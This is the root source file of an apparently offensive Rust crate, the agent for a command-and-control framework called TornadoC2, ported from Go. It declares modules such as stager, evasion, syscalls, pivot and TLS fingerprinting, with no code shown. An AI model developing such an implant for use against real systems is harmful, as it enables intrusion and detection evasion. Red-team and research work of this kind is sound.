// tornadoc2_agent — library crate for the TornadoC2 Rust agent.
//
// See agent.txt for the full port map. Each top-level module below
// corresponds to one Go package in the original tree.
//
// Note: `core` is a module name here. Within this crate, refer to
// it as `crate::core`. The standard library's `core` crate is
// unaffected.

pub mod config;
pub mod crypto;
pub mod features;
pub mod pivot;
pub mod protocol;
pub mod stager;
pub mod syscalls;
pub mod tlsfp;

pub mod core;
pub mod evasion;
pub mod native;
pub mod platform;
pub mod transport;
